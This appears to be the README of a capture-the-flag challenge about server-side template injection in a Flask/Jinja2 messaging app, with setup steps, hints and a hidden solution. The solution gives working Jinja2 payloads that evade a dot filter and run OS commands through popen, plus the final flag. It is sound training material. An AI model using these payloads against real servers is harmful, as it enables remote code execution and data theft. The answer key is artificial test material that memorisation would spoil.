# SSTI CTF Challenge

A Server-Side Template Injection (SSTI) challenge created with Flask and Jinja2 templates.

## Challenge Description

This challenge involves a simple messaging service that contains a Server-Side Template Injection vulnerability. Your goal is to exploit this vulnerability to retrieve the hidden flag.

## Deployment Instructions

### Using Docker Compose (Recommended)

1. Make sure you have Docker and Docker Compose installed.
2. Run the following command to build and start the container:

```
docker-compose up -d
```

3. Access the challenge at `http://localhost:5000`

### Manual Setup

1. Install the required Python packages:

```
pip install -r requirements.txt
```

2. Run the Flask application:

```
python app/app.py
```

3. Access the challenge at `http://localhost:5000`

## Challenge Hints

1. The messaging service doesn't properly sanitize the input.
2. Jinja2 templates can execute Python code under certain conditions.
3. The admin page contains the flag, but how can you access it without directly visiting the page?
4. The application blocks the dot character ('.'), so you must use bracket notation (e.g. foo['bar']) instead of dot notation.

## Solution

<details>
<summary>Click to reveal solution</summary>

This challenge involves a Server-Side Template Injection vulnerability in a Flask application using Jinja2 templates.

1. **Identify the vulnerability**: Go to the "Leave a Message" page and test for SSTI by entering template syntax in the name field.

   - Try `{{7*7}}` - If this renders as 49, it confirms the SSTI vulnerability exists
   - This works because the user input is directly inserted into a template without proper sanitization

2. **Basic enumeration**: Explore the application context to gather information.

   - `{{config}}` - Reveals the Flask configuration
   - `{{config.items()}}` - Shows configuration as key-value pairs
   - These work because Jinja2 templates have access to the Flask application context

3. **Working around restrictions**: The application blocks the dot character (`.`), so we must use bracket notation.

   - Instead of `object.attribute`, we use `object['attribute']`
   - This bypass works because both notations access attributes in Python, but the filter only blocks the dot syntax

4. **Getting remote code execution**: Access Python's built-in functions to execute system commands.

   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
   - This payload works by:
     - Starting with the `request` object (available in templates)
     - Accessing the application context
     - Reaching Python's built-in functions through `__globals__` and `__builtins__`
     - Using `__import__` to import the `os` module
     - Executing `ls` command with `popen` and reading the output

5. **Retrieving part 1 of the flag**: Access the FLAG variable stored in the app module.

   - `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
   - This accesses the app module's dictionary to find the FLAG variable defined in the application

6. **Retrieving part 2 of the flag**: Read the flag.txt file from the filesystem.

   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag*')['read']()}}`
   - We use the wildcard `*` to bypass the blacklisted dot `.` in the filename

7. **Combining the flags**: Put both parts together to get the complete flag.
   - The final flag is: `ETHACK{es_es_ti_ai_ahayahay}`

</details>
